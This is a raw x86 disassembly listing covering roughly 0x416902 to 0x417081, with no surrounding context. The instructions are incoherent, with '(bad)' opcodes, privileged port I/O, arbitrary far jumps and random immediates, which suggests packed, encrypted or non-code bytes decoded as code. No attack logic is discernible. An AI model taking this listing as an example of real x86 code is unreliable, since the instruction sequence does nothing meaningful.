  416902:	push   ebx
  416903:	sbb    al,0x21
  416905:	dec    esi
  416906:	pop    ebx
  416907:	jbe    0x41690d
  416909:	xchg   ecx,eax
  41690a:	mov    bl,BYTE PTR [eax+edx*8-0x25a3101a]
  416911:	outs   dx,DWORD PTR ds:[esi]
  416912:	mov    eax,0x50961430
  416917:	aad    0x76
  416919:	outs   dx,BYTE PTR ds:[esi]
  41691a:	js     0x4168d7
  41691c:	daa    
  41691d:	mov    bl,0xef
  41691f:	push   ss
  416920:	loop   0x416970
  416922:	int    0xa4
  416924:	cmp    ebx,esp
  416926:	fiadd  DWORD PTR [edx+0x1a]
  416929:	stos   BYTE PTR es:[edi],al
  41692a:	jmp    0xd59c:0xb58d0f0a
  416931:	sub    bh,BYTE PTR [edi]
  416933:	repz mov eax,DWORD PTR [esi+edi*1-0x622730d8]
  41693b:	or     bl,BYTE PTR [esi+eiz*1-0x3a]
  41693f:	mov    cs,WORD PTR [ecx+0x414bf7a2]
  416945:	sub    al,0xc8
  416947:	lods   al,BYTE PTR ds:[esi]
  416948:	aad    0xcc
  41694a:	push   cs
  41694b:	cld    
  41694c:	in     eax,dx
  41694d:	and    BYTE PTR ds:0x9894d257,0x2e
  416954:	ja     0x4169ad
  416956:	cmc    
  416957:	pop    ebx
  416958:	fiadd  DWORD PTR [edx-0x504f965b]
  41695e:	xchg   DWORD PTR ds:0x173b9255,esi
  416964:	rcr    bl,1
  416966:	in     eax,dx
  416967:	mov    ah,0x61
  416969:	push   ebx
  41696a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41696b:	sub    bh,dl
  41696d:	neg    BYTE PTR [ebp+edx*4+0x47ce8109]
  416974:	sub    edx,DWORD PTR [edi-0x24c8d39e]
  41697a:	inc    ecx
  41697b:	mov    ds:0xaf33d29d,al
  416980:	call   FWORD PTR [edx+0x38713176]
  416986:	inc    edx
  416987:	and    DWORD PTR [si+0x5d44],ebp
  41698c:	xchg   ebx,eax
  41698d:	cmp    bh,cl
  41698f:	xchg   ebx,eax
  416990:	xor    al,0xd7
  416992:	fs std 
  416994:	loope  0x4169c6
  416996:	push   es
  416997:	push   ecx
  416998:	sahf   
  416999:	out    0xf7,al
  41699b:	or     eax,0x18d78804
  4169a0:	dec    edi
  4169a1:	mov    ss,WORD PTR [esi+0x4d1757e2]
  4169a7:	in     eax,0xe1
  4169a9:	inc    ebp
  4169aa:	mov    edi,0x376d756e
  4169af:	sbb    ebp,DWORD PTR [esp+ebx*1]
  4169b2:	dec    eax
  4169b3:	iret   
  4169b4:	dec    bp
  4169b6:	xchg   BYTE PTR [edx+0x29e24da1],bl
  4169bc:	mov    gs,WORD PTR [ebx-0x7e]
  4169bf:	xchg   esp,eax
  4169c0:	cmp    edi,0x8f7d53f3
  4169c6:	sti    
  4169c7:	or     eax,0x516fe7ac
  4169cc:	add    ecx,DWORD PTR [esi-0x5c8a73c9]
  4169d2:	bound  ecx,QWORD PTR [edi-0x20700bf0]
  4169d8:	cld    
  4169d9:	fnstcw WORD PTR [ecx+ebx*2-0x41127327]
  4169e0:	push   0x2f
  4169e2:	mov    esi,0x2ece495e
  4169e7:	sar    DWORD PTR [ecx],1
  4169e9:	in     al,0x75
  4169eb:	add    edx,0xffffff8f
  4169ee:	stos   DWORD PTR es:[edi],eax
  4169ef:	add    BYTE PTR [esi],ch
  4169f1:	jg     0x416a22
  4169f3:	push   ss
  4169f4:	push   cs
  4169f5:	inc    ebx
  4169f6:	int    0xa7
  4169f8:	fstp   st(6)
  4169fa:	ss sar ebx,1
  4169fd:	pop    ss
  4169fe:	jecxz  0x416a7b
  416a00:	inc    eax
  416a01:	lock mov DWORD PTR [ebp+0x59],eax
  416a05:	stos   DWORD PTR es:[edi],eax
  416a06:	(bad)  
  416a07:	sbb    DWORD PTR [edi+0x1c7c5f3],esi
  416a0d:	jecxz  0x4169c2
  416a0f:	test   al,0xbf
  416a11:	sbb    al,0x95
  416a13:	sti    
  416a14:	lea    ebx,[edx-0x5520e608]
  416a1a:	push   edx
  416a1b:	push   eax
  416a1c:	jle    0x416a9b
  416a1e:	not    BYTE PTR [esi-0x7f]
  416a21:	cdq    
  416a22:	inc    edi
  416a23:	jb     0x416a56
  416a25:	mov    ds:0x5c54a4ca,eax
  416a2a:	or     DWORD PTR [edi+0x6560ebeb],0xffffffc0
  416a31:	xchg   edi,esp
  416a33:	mov    ecx,0x92eaac5f
  416a38:	sbb    al,0x48
  416a3a:	inc    eax
  416a3b:	mov    edx,0xfa35ba7b
  416a40:	xor    al,0x25
  416a42:	jle    0x416ac3
  416a44:	pop    eax
  416a45:	add    DWORD PTR [eax],edx
  416a47:	ins    BYTE PTR es:[edi],dx
  416a48:	das    
  416a49:	in     eax,0xbd
  416a4b:	frstor [esi+0x6e851103]
  416a51:	xor    ebx,edx
  416a53:	out    dx,al
  416a54:	sbb    al,0xe9
  416a56:	stc    
  416a57:	jo     0x416a84
  416a59:	mov    dh,0xb4
  416a5b:	scas   al,BYTE PTR es:[edi]
  416a5c:	mov    dl,0xfe
  416a5e:	push   esp
  416a5f:	add    eax,0x782c54a9
  416a64:	stc    
  416a65:	test   DWORD PTR [esi+edx*2],ebx
  416a68:	shl    cl,cl
  416a6a:	xlat   BYTE PTR ds:[ebx]
  416a6b:	es fs ret 
  416a6e:	xchg   DWORD PTR [eax],edx
  416a70:	repnz leave 
  416a72:	loop   0x416a45
  416a74:	fild   DWORD PTR [ecx+0x63126d22]
  416a7a:	push   ebp
  416a7b:	scas   al,BYTE PTR es:[edi]
  416a7c:	add    dl,dh
  416a7e:	sbb    ah,ch
  416a80:	jmp    FWORD PTR [edx-0xc]
  416a83:	aaa    
  416a84:	inc    ecx
  416a85:	mov    edx,0x1b555b
  416a8a:	xlat   BYTE PTR ds:[ebx]
  416a8b:	outs   dx,BYTE PTR ds:[esi]
  416a8c:	out    dx,eax
  416a8d:	mov    ?,WORD PTR [ebx-0x5ae26cbc]
  416a93:	pushf  
  416a94:	mov    bh,0xd0
  416a96:	fnsave [ecx]
  416a98:	addr16 add al,0x12
  416a9b:	rcl    BYTE PTR [edx+0x23],1
  416a9e:	cmc    
  416a9f:	xchg   esi,eax
  416aa0:	push   ebx
  416aa1:	dec    edi
  416aa2:	hlt    
  416aa3:	dec    eax
  416aa4:	clc    
  416aa5:	repz adc cl,BYTE PTR [esi]
  416aa8:	int3   
  416aa9:	test   BYTE PTR [edx-0x738d1dce],0xc
  416ab0:	ret    
  416ab1:	inc    edi
  416ab2:	jae    0x416a37
  416ab4:	inc    ecx
  416ab5:	sbb    al,0x7e
  416ab7:	xor    eax,0x9aa3c307
  416abc:	jge    0x416a7e
  416abe:	xor    DWORD PTR [ebx+eax*1-0x6c],edx
  416ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ac3:	inc    eax
  416ac4:	nop
  416ac5:	call   0xd239490e
  416aca:	xor    bh,dl
  416acc:	sti    
  416acd:	(bad)  
  416ace:	jb     0x416a7a
  416ad0:	mov    dl,0xdc
  416ad2:	cmp    bh,bh
  416ad4:	push   esp
  416ad5:	je     0x416b0d
  416ad7:	adc    al,0x65
  416ad9:	es pushf 
  416adb:	cmc    
  416adc:	push   si
  416ade:	das    
  416adf:	adc    DWORD PTR [ecx-0x74bb81ff],edi
  416ae5:	je     0x416b16
  416ae7:	ss icebp 
  416ae9:	xor    al,0x7e
  416aeb:	pusha  
  416aec:	jl     0x416ae7
  416aee:	imul   esi,DWORD PTR [ebx],0x3e190aea
  416af4:	adc    BYTE PTR [eax-0x2],0xaf
  416af8:	push   es
  416af9:	cmc    
  416afa:	outs   dx,BYTE PTR ds:[esi]
  416afb:	sub    al,0x9c
  416afd:	ret    0xcd91
  416b00:	fwait
  416b01:	push   ss
  416b02:	jecxz  0x416aa2
  416b04:	imul   eax,DWORD PTR [ebp+0x120c56b5],0x926310c6
  416b0e:	cmp    esp,eax
  416b10:	mov    cl,0x85
  416b12:	add    cl,dl
  416b14:	add    eax,0x8071e1c7
  416b19:	dec    esp
  416b1a:	xchg   ecx,eax
  416b1b:	pop    esp
  416b1c:	imul   ecx,DWORD PTR [edx],0x76b068e8
  416b22:	add    ch,BYTE PTR [esi]
  416b24:	or     edx,esp
  416b26:	lds    ecx,FWORD PTR [edx]
  416b28:	(bad)
  416b2b:	icebp  
  416b2c:	rcr    DWORD PTR [edi-0x43],0x3a
  416b30:	push   esp
  416b31:	dec    eax
  416b32:	jge    0x416b21
  416b34:	push   edi
  416b35:	stc    
  416b36:	or     ecx,DWORD PTR [edx]
  416b38:	pop    edx
  416b39:	in     eax,dx
  416b3a:	cs rcl eax,cl
  416b3d:	mov    eax,ds:0x60865edc
  416b42:	inc    ebx
  416b43:	jne    0x416ba9
  416b45:	sub    edi,DWORD PTR [esi-0x58]
  416b48:	lds    ebp,FWORD PTR [edx]
  416b4a:	mov    dh,0x3a
  416b4c:	add    eax,0x49c98802
  416b51:	scas   al,BYTE PTR es:[edi]
  416b52:	out    0x39,eax
  416b54:	add    bh,BYTE PTR [edi-0x3d]
  416b57:	push   DWORD PTR [edx]
  416b59:	or     BYTE PTR [ebx],bh
  416b5b:	jmp    0x7973:0x289d6327
  416b62:	fs test al,0xc6
  416b65:	xchg   BYTE PTR ds:0xcf182d3b,cl
  416b6b:	and    eax,0xb1746fc0
  416b70:	stos   DWORD PTR es:[edi],eax
  416b71:	mov    WORD PTR ds:0x802ffd96,es
  416b77:	(bad)  
  416b79:	add    BYTE PTR [esi-0x80],0xcc
  416b7d:	mov    cl,ch
  416b7f:	adc    BYTE PTR [ecx+0x41f3be38],ah
  416b85:	loope  0x416bc5
  416b87:	xchg   ecx,eax
  416b88:	lods   al,BYTE PTR ds:[esi]
  416b89:	pop    esi
  416b8a:	repz mov ?,WORD PTR [ebp-0x50]
  416b8e:	jbe    0x416c0f
  416b90:	inc    edi
  416b91:	stos   DWORD PTR es:[edi],eax
  416b92:	ror    DWORD PTR ds:[edi-0x13],cl
  416b96:	cmp    DWORD PTR [edx],esp
  416b98:	sub    al,0x52
  416b9a:	dec    edi
  416b9b:	aam    0x51
  416b9d:	jo     0x416b7d
  416b9f:	mov    eax,0x169656ab
  416ba4:	fwait
  416ba5:	jl     0x416bd8
  416ba7:	pop    ss
  416ba8:	and    ah,BYTE PTR [esi+edi*4]
  416bab:	push   edi
  416bac:	xchg   esp,eax
  416bad:	inc    edi
  416bae:	pop    fs
  416bb0:	shl    DWORD PTR [ebp-0x6456cdbe],0xc8
  416bb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bb8:	inc    edi
  416bb9:	fs retf 0xd6f5
  416bbd:	sahf   
  416bbe:	clc    
  416bbf:	mov    ecx,ebx
  416bc1:	add    DWORD PTR [ecx],ecx
  416bc3:	icebp  
  416bc4:	mov    dh,0x78
  416bc6:	xor    edx,ebx
  416bc8:	jl     0x416c31
  416bca:	mov    al,BYTE PTR [ebx+0x71]
  416bcd:	inc    edi
  416bce:	out    dx,al
  416bcf:	inc    eax
  416bd0:	and    DWORD PTR [ebx-0x64],eax
  416bd3:	mov    edx,0xbcccc1fe
  416bd8:	jl     0x416b81
  416bda:	adc    al,0x58
  416bdc:	dec    ebx
  416bdd:	call   0xb0b1dbb3
  416be2:	popa   
  416be3:	inc    ecx
  416be4:	call   0x9f3315ab
  416be9:	mov    cl,0xd7
  416beb:	mov    dh,0x66
  416bed:	cmp    DWORD PTR [ebx],esi
  416bef:	adc    BYTE PTR [eax-0x6b43a60d],cl
  416bf5:	stc    
  416bf6:	xor    BYTE PTR [esi-0x39],bl
  416bf9:	in     al,0x81
  416bfb:	aas    
  416bfc:	add    eax,0x89dbc5ff
  416c01:	jecxz  0x416c17
  416c03:	mov    ebx,0x4e87fe4f
  416c08:	and    bl,BYTE PTR ds:[edi+0x3c]
  416c0c:	sbb    DWORD PTR [edx-0x372478f3],eax
  416c12:	push   eax
  416c13:	sbb    al,0x44
  416c15:	and    BYTE PTR [ebp+0x26],dh
  416c18:	imul   edi,DWORD PTR [esi-0x6157ab52],0x75
  416c1f:	scas   eax,DWORD PTR es:[edi]
  416c20:	(bad)  
  416c21:	pop    ebx
  416c22:	jae    0x416bf8
  416c24:	xchg   esp,eax
  416c25:	and    DWORD PTR [esi+ecx*8-0x2b],esp
  416c29:	push   edx
  416c2a:	pop    ds
  416c2b:	xchg   esi,eax
  416c2c:	mov    dl,0x76
  416c2e:	js     0x416c6e
  416c30:	cld    
  416c31:	push   cs
  416c32:	jecxz  0x416c6a
  416c34:	mov    eax,ds:0xdfd769a2
  416c39:	aaa    
  416c3a:	int    0xa0
  416c3c:	add    eax,0xaa3448af
  416c41:	les    esi,FWORD PTR [edi+edi*8]
  416c44:	cmc    
  416c45:	xchg   esp,eax
  416c46:	sbb    BYTE PTR [ebp+0x653819fc],bh
  416c4c:	push   eax
  416c4d:	xor    BYTE PTR [edx],dh
  416c4f:	mov    ch,BYTE PTR [esp+eiz*2+0x337b8787]
  416c56:	gs call 0x7542:0x9b333dd8
  416c5e:	jmp    0x6d6a:0x4c61f48b
  416c65:	lahf   
  416c66:	addr16 jb 0xd4f1cdd0
  416c6d:	loope  0x416ced
  416c6f:	and    edx,DWORD PTR [ebx+0xf]
  416c72:	nop
  416c73:	lea    edx,[edi]
  416c75:	sar    DWORD PTR [edi+0x7336b9f],0xa8
  416c7c:	sbb    eax,0x48f798b3
  416c81:	pop    ebp
  416c82:	pop    ecx
  416c83:	shr    DWORD PTR [ebx+ebp*4-0xe],cl
  416c87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c88:	inc    edx
  416c89:	cld    
  416c8a:	pusha  
  416c8b:	daa    
  416c8c:	jae    0x416ca0
  416c8e:	jnp    0x416c3f
  416c90:	xlat   BYTE PTR ds:[ebx]
  416c91:	imul   ecx,DWORD PTR [ebx+esi*1+0x62ef8f97],0x50
  416c99:	cmp    bl,BYTE PTR [esi-0x3d15369]
  416c9f:	sbb    eax,DWORD PTR [esi]
  416ca1:	jmp    0x416d0e
  416ca3:	test   dl,dh
  416ca5:	lahf   
  416ca6:	pop    esi
  416ca7:	jo     0x416cf5
  416ca9:	mov    bh,0xb7
  416cab:	mov    ebp,0x4b625d28
  416cb0:	push   0x62
  416cb2:	pop    ebx
  416cb3:	jle    0x416c77
  416cb5:	arpl   WORD PTR [ebp-0x4],bx
  416cb8:	pushf  
  416cb9:	dec    esi
  416cba:	jecxz  0x416d21
  416cbc:	pop    eax
  416cbd:	js     0x416c63
  416cbf:	adc    BYTE PTR [ecx+eax*1-0x4ab24b98],ch
  416cc6:	jle    0x416cd9
  416cc8:	fisub  DWORD PTR [esi+0x13]
  416ccb:	shl    DWORD PTR [edx-0x299bb831],1
  416cd1:	add    BYTE PTR [edi+0x25ec6220],0x38
  416cd8:	in     eax,dx
  416cd9:	mov    dh,BYTE PTR [ebp-0x5ff9c429]
  416cdf:	jno    0x416cbc
  416ce1:	sahf   
  416ce2:	xchg   edx,eax
  416ce3:	in     eax,0x9
  416ce5:	and    al,0x79
  416ce7:	out    dx,al
  416ce8:	dec    edi
  416ce9:	and    DWORD PTR [ecx-0x71c32988],eax
  416cef:	dec    ebx
  416cf0:	mov    edi,0xa84a251
  416cf5:	jg     0x416d10
  416cf7:	loop   0x416d47
  416cf9:	jge    0x416d21
  416cfb:	mov    dh,0x36
  416cfd:	stos   DWORD PTR es:[edi],eax
  416cfe:	add    bl,0x31
  416d01:	pop    esp
  416d02:	jo     0x416d2c
  416d04:	xchg   esp,eax
  416d05:	mov    cl,0xe8
  416d07:	test   BYTE PTR [ecx+ebp*4-0x6c],dh
  416d0b:	dec    edx
  416d0c:	int3   
  416d0d:	lods   eax,DWORD PTR ds:[esi]
  416d0e:	neg    DWORD PTR [eax+eiz*4-0xd5372bc]
  416d15:	mov    ebp,0x431de815
  416d1a:	push   cs
  416d1b:	mov    al,ds:0x86592b03
  416d20:	pop    edx
  416d21:	push   ss
  416d22:	mov    dl,0xff
  416d24:	out    dx,al
  416d25:	in     eax,dx
  416d26:	lods   eax,DWORD PTR ds:[esi]
  416d27:	loop   0x416d93
  416d29:	inc    esp
  416d2a:	dec    edi
  416d2b:	pusha  
  416d2c:	or     ch,bh
  416d2e:	in     al,dx
  416d2f:	mov    eax,DWORD PTR [esi+0x14fc683]
  416d35:	stc    
  416d36:	popa   
  416d37:	fild   WORD PTR [ebx]
  416d39:	mov    bl,0x98
  416d3b:	xchg   DWORD PTR ds:0xb6c24710,esp
  416d41:	mov    bl,0x4e
  416d43:	out    0x26,al
  416d45:	rep outs dx,BYTE PTR ds:[esi]
  416d47:	nop
  416d48:	(bad)  
  416d49:	aam    0x92
  416d4b:	ins    DWORD PTR es:[edi],dx
  416d4c:	lea    ebp,[ebx-0x6f]
  416d4f:	cs pop ss
  416d51:	xchg   al,ah
  416d53:	jmp    0x416d3d
  416d55:	pop    ss
  416d56:	or     al,0x6
  416d58:	mov    ds:0x6885e5e2,eax
  416d5d:	mov    dl,0xab
  416d5f:	adc    bl,BYTE PTR [edx+0x46]
  416d62:	adc    BYTE PTR [eax-0x4c],ah
  416d65:	test   dl,bh
  416d67:	test   DWORD PTR [edx],edi
  416d69:	(bad)  
  416d6a:	fsub   DWORD PTR gs:[esi]
  416d6d:	jg     0x416dc2
  416d6f:	out    dx,al
  416d70:	popa   
  416d71:	jl     0x416da1
  416d73:	inc    edi
  416d74:	call   0xf942:0x1c24fd52
  416d7b:	dec    ecx
  416d7c:	jne    0x416d08
  416d7e:	and    al,0x94
  416d80:	lahf   
  416d81:	cmp    ebp,0xffffff86
  416d84:	jnp    0x416d9f
  416d86:	loopne 0x416d17
  416d88:	adc    dl,BYTE PTR [edi-0x13e62dc2]
  416d8e:	(bad)  
  416d8f:	cmp    al,0xdb
  416d91:	aas    
  416d92:	cli    
  416d93:	or     eax,0x6b173452
  416d98:	mov    bh,0x21
  416d9a:	or     BYTE PTR cs:0x55e3c04e,cl
  416da1:	stos   DWORD PTR es:[edi],eax
  416da2:	scas   eax,DWORD PTR es:[edi]
  416da3:	add    edx,DWORD PTR [ebx+ebx*2-0x7c]
  416da7:	adc    BYTE PTR [esi+0x29],0x71
  416dab:	push   ebx
  416dac:	or     BYTE PTR [edi-0x5902c33],bh
  416db2:	mov    edi,0x83a4f345
  416db7:	out    dx,eax
  416db8:	dec    edi
  416db9:	ror    BYTE PTR ds:0x4bc7177,0x19
  416dc0:	push   ebp
  416dc1:	add    BYTE PTR [ecx-0x1a],ah
  416dc4:	jecxz  0x416d7c
  416dc6:	mov    bh,dl
  416dc8:	xchg   al,dh
  416dca:	(bad)  [ebx]
  416dcc:	push   cs
  416dcd:	jbe    0x416e04
  416dcf:	int3   
  416dd0:	dec    ebx
  416dd1:	pop    esi
  416dd2:	and    DWORD PTR [esi+ecx*2+0x65a0805d],eax
  416dd9:	jl     0x416de2
  416ddb:	rcl    BYTE PTR [ecx*8-0x2e833694],1
  416de2:	pop    es
  416de3:	pushf  
  416de4:	ja     0x416da5
  416de6:	or     al,0xb9
  416de8:	xchg   ebp,eax
  416de9:	and    bh,bl
  416deb:	inc    eax
  416dec:	cwde   
  416ded:	jecxz  0x416df9
  416def:	add    BYTE PTR [eax-0x3e488516],dh
  416df5:	std    
  416df6:	add    ch,dl
  416df8:	jl     0x416d9c
  416dfa:	jmp    0x34c6:0xe4bcc9ea
  416e01:	cld    
  416e02:	and    eax,0xfc9cd531
  416e07:	push   eax
  416e08:	mov    ds:0x7f06a322,al
  416e0d:	push   edx
  416e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e0f:	push   eax
  416e10:	sti    
  416e11:	xor    BYTE PTR [ecx],ah
  416e13:	ins    DWORD PTR es:[edi],dx
  416e14:	cdq    
  416e15:	loop   0x416e72
  416e17:	push   ds
  416e18:	je     0x416e35
  416e1a:	cdq    
  416e1b:	fsubr  DWORD PTR [edx-0x72]
  416e1e:	leave  
  416e1f:	xchg   edi,eax
  416e20:	xchg   ebx,eax
  416e21:	xchg   ecx,eax
  416e22:	into   
  416e23:	ja     0x416e43
  416e25:	add    bh,ah
  416e27:	add    DWORD PTR [edx-0x9cebd18],ebx
  416e2d:	push   ds
  416e2e:	mov    ch,0x83
  416e30:	loop   0x416e89
  416e32:	mov    ah,0xb7
  416e34:	mov    ecx,0xf9caccdd
  416e39:	pop    esi
  416e3a:	jecxz  0x416eb1
  416e3c:	jg     0x416e0b
  416e3e:	mov    WORD PTR [ebp+0x79887856],fs
  416e44:	jmp    0x3dc5b8f7
  416e49:	pop    esp
  416e4a:	xchg   ebx,eax
  416e4b:	jp     0x416e6b
  416e4d:	scas   al,BYTE PTR es:[edi]
  416e4e:	sub    dl,cl
  416e50:	popf   
  416e51:	xor    eax,0x850e465d
  416e56:	rcr    BYTE PTR [edx+eiz*8],1
  416e59:	pop    eax
  416e5a:	fmulp  st(6),st
  416e5c:	pop    esp
  416e5d:	fs aas 
  416e5f:	out    0x42,eax
  416e61:	aaa    
  416e62:	jno    0x416dec
  416e64:	adc    dh,cl
  416e66:	scas   al,BYTE PTR es:[edi]
  416e67:	adc    ah,BYTE PTR [eax+esi*1-0x57]
  416e6b:	hlt    
  416e6c:	ror    BYTE PTR [ebp+0x19],1
  416e6f:	scas   eax,DWORD PTR es:[edi]
  416e70:	push   0xfffffff8
  416e72:	or     DWORD PTR [ecx],esi
  416e74:	pop    esp
  416e75:	xor    eax,0x53637bd6
  416e7a:	mov    ecx,0xd0699b43
  416e7f:	jle    0x416e97
  416e81:	arpl   WORD PTR [ecx-0x48],ax
  416e84:	test   eax,0x3ec2d4b0
  416e89:	lods   al,BYTE PTR ds:[esi]
  416e8a:	in     eax,0xc2
  416e8c:	mov    ch,BYTE PTR [edx-0x23800af8]
  416e92:	sub    bh,BYTE PTR [ebx+0x1c858865]
  416e98:	push   ds
  416e99:	or     DWORD PTR [edi],edi
  416e9b:	mov    bl,0xfb
  416e9d:	ds pop edx
  416e9f:	and    edi,DWORD PTR [ebx+eax*1]
  416ea2:	sub    eax,0x356137c4
  416ea7:	push   ss
  416ea8:	adc    ch,cl
  416eaa:	pop    ebp
  416eab:	aam    0x88
  416ead:	push   edi
  416eae:	shl    DWORD PTR [edx+0x1ac7951c],cl
  416eb4:	add    esp,DWORD PTR [ebx+edi*8+0x65]
  416eb8:	pop    es
  416eb9:	ds neg al
  416ebc:	scas   eax,DWORD PTR es:[edi]
  416ebd:	jns    0x416eb4
  416ebf:	mov    dh,0xa1
  416ec1:	mov    esp,0xd2fb8a48
  416ec6:	pop    ss
  416ec7:	sahf   
  416ec8:	and    al,0x34
  416eca:	in     eax,dx
  416ecb:	bound  eax,QWORD PTR [eax]
  416ecd:	sbb    eax,0x700bf3f2
  416ed2:	out    dx,al
  416ed3:	or     edi,edi
  416ed5:	cdq    
  416ed6:	(bad)  
  416ed7:	sahf   
  416ed8:	gs enter 0x8214,0xff
  416edd:	mov    bl,0x1e
  416edf:	fmul   st(3),st
  416ee1:	jl     0x416f23
  416ee3:	xchg   ebx,eax
  416ee4:	out    dx,eax
  416ee5:	and    cl,BYTE PTR [ebp-0x1d]
  416ee8:	jl     0x416f0a
  416eea:	loop   0x416ea8
  416eec:	or     eax,0x2b8781d3
  416ef1:	sub    BYTE PTR [ecx],0x2d
  416ef4:	sahf   
  416ef5:	test   DWORD PTR [ebx+0x3e],eax
  416ef8:	daa    
  416ef9:	inc    esi
  416efa:	xor    DWORD PTR [edx+0x59bd9d43],eax
  416f00:	inc    ebx
  416f01:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  416f03:	scas   al,BYTE PTR es:[edi]
  416f04:	push   ss
  416f05:	jns    0x416f32
  416f07:	or     BYTE PTR [esi-0x52],dl
  416f0a:	mov    bh,0x99
  416f0c:	cmp    bl,bh
  416f0e:	test   BYTE PTR [edi+edi*2],ah
  416f11:	mov    al,ds:0x8d349778
  416f16:	outs   dx,BYTE PTR ds:[esi]
  416f17:	xor    esp,DWORD PTR [edx-0x7bd2032e]
  416f1d:	adc    DWORD PTR [ebp-0x7be4457],0x5f
  416f24:	in     eax,0xb6
  416f26:	jmp    0x416ef9
  416f28:	test   eax,0x6b5b6fbc
  416f2d:	or     BYTE PTR [edi-0x563a9836],dh
  416f33:	scas   eax,DWORD PTR es:[edi]
  416f34:	stc    
  416f35:	mov    ah,0xdf
  416f37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f38:	test   BYTE PTR [esi+0x620d9df1],0xca
  416f3f:	outs   dx,BYTE PTR ds:[esi]
  416f40:	push   eax
  416f41:	dec    edi
  416f42:	and    al,0x7f
  416f44:	test   eax,0x4a0bd730
  416f49:	(bad)  
  416f4a:	adc    eax,0x595b47e7
  416f4f:	(bad)  
  416f50:	xchg   ebx,eax
  416f51:	lock pop ss
  416f53:	xor    BYTE PTR [ecx+0x78],al
  416f56:	adc    edi,DWORD PTR [edi+0x71]
  416f59:	sbb    edi,DWORD PTR [edi+edx*8]
  416f5c:	mov    ah,0x33
  416f5e:	inc    ebp
  416f5f:	mov    ds,WORD PTR [eax+0x1b01efca]
  416f65:	inc    esp
  416f66:	mov    al,0x53
  416f68:	add    esp,ebp
  416f6a:	ja     0x416f62
  416f6c:	add    ebx,DWORD PTR [ebx+0x32]
  416f6f:	pop    es
  416f70:	ret    
  416f71:	dec    esi
  416f72:	and    al,0xcf
  416f74:	or     al,0xb1
  416f76:	ja     0x416fdd
  416f78:	push   cs
  416f79:	stos   BYTE PTR es:[edi],al
  416f7a:	loope  0x416fc6
  416f7c:	xlat   BYTE PTR ds:[ebx]
  416f7d:	pop    eax
  416f7e:	adc    dh,bh
  416f80:	ss jle 0x416fa5
  416f83:	fcom   QWORD PTR [eax+0x2732f688]
  416f89:	add    al,0x2e
  416f8b:	shl    DWORD PTR [eax+ecx*1],cl
  416f8e:	jne    0x416f92
  416f90:	inc    ebp
  416f91:	lods   al,BYTE PTR ds:[esi]
  416f92:	cmc    
  416f93:	push   edi
  416f94:	lods   eax,DWORD PTR ds:[esi]
  416f95:	cmp    BYTE PTR [ebp+0x31],al
  416f98:	xchg   DWORD PTR [ecx],esi
  416f9a:	rol    eax,cl
  416f9c:	mov    dh,0x8b
  416f9e:	pop    edi
  416f9f:	push   ss
  416fa0:	push   esi
  416fa1:	sub    al,0xfb
  416fa3:	xchg   edi,eax
  416fa4:	mov    esi,0x54f7a361
  416fa9:	mov    ds:0x5e7af1d,eax
  416fae:	cwde   
  416faf:	hlt    
  416fb0:	jns    0x416fd3
  416fb2:	sbb    BYTE PTR [esi-0x7f],bh
  416fb5:	arpl   sp,di
  416fb7:	in     al,0xe4
  416fb9:	std    
  416fba:	push   0xe1383b62
  416fbf:	jo     0x41701c
  416fc1:	aas    
  416fc2:	push   ebx
  416fc3:	stos   DWORD PTR es:[edi],eax
  416fc4:	jno    0x416fa0
  416fc6:	xchg   edx,eax
  416fc8:	mov    ebp,0x78930dd2
  416fcd:	(bad)  
  416fce:	retf   0xc4e9
  416fd1:	fistp  WORD PTR [ecx+0x520df40e]
  416fd7:	icebp  
  416fd8:	jmp    0xe0d1b08f
  416fdd:	xchg   esi,eax
  416fde:	cs lahf 
  416fe0:	pushf  
  416fe1:	clc    
  416fe2:	outs   dx,DWORD PTR ds:[esi]
  416fe3:	push   esp
  416fe4:	js     0x417022
  416fe6:	sub    al,0x78
  416fe8:	xchg   esp,eax
  416fe9:	sub    BYTE PTR cs:[ebx],ch
  416fec:	in     eax,dx
  416fed:	or     DWORD PTR [ebp+0x3624fbb8],esi
  416ff3:	and    BYTE PTR [edi-0x3b],ah
  416ff6:	xchg   esi,eax
  416ff7:	pusha  
  416ff8:	jg     0x41706b
  416ffa:	fisub  DWORD PTR [edi-0x4b]
  416ffd:	icebp  
  416ffe:	add    BYTE PTR [eax],ch
  417000:	mov    ?,WORD PTR [ebx]
  417002:	pop    esi
  417003:	cmc    
  417004:	sub    BYTE PTR [ecx+0x71eb4333],dl
  41700a:	ins    BYTE PTR es:[edi],dx
  41700b:	and    eax,0xcc5a323
  417010:	xchg   esi,eax
  417011:	jg     0x41705a
  417013:	aas    
  417014:	fidiv  DWORD PTR [esi]
  417016:	int3   
  417017:	bound  eax,QWORD PTR [eax+0x37]
  41701a:	push   esi
  41701b:	arpl   WORD PTR [eax-0x28],dx
  41701e:	mov    esi,0xa33b239a
  417023:	repz (bad) 
  417025:	in     al,0xb7
  417027:	adc    ch,BYTE PTR [eax]
  417029:	or     eax,0x3e7da169
  41702e:	mov    al,0x38
  417030:	nop
  417031:	ins    BYTE PTR es:[edi],dx
  417032:	xchg   edx,eax
  417033:	shl    esi,cl
  417035:	sbb    eax,0xae3b96a8
  41703a:	lds    ebx,FWORD PTR [ecx+0x27]
  41703d:	or     eax,ecx
  41703f:	and    ebx,DWORD PTR [ebp+0x42]
  417042:	in     al,dx
  417043:	imul   ebp,DWORD PTR [esi+0xb10c8ee],0xaf1ceb40
  41704d:	xor    eax,0x8d0a822
  417052:	add    eax,0xf0e9f12c
  417057:	dec    esi
  417058:	ja     0x416ffe
  41705a:	add    bh,BYTE PTR [ebp+0x20]
  41705d:	outs   dx,DWORD PTR ds:[esi]
  41705e:	dec    edi
  41705f:	aas    
  417060:	xchg   esp,eax
  417061:	add    ah,BYTE PTR [ebp+0x68274e65]
  417067:	mov    dh,0xf1
  417069:	jb     0x4170c0
  41706b:	pop    eax
  41706c:	das    
  41706d:	mov    ecx,0x3ea47e67
  417072:	jbe    0x4170bb
  417074:	rol    BYTE PTR [eax],cl
  417076:	and    esp,DWORD PTR [ebx+0x3214e5b6]
  41707c:	cmp    DWORD PTR [esi+0x46],ecx
  41707f:	lock push es
  417081:	scas   eax,DWORD PTR es:[edi]
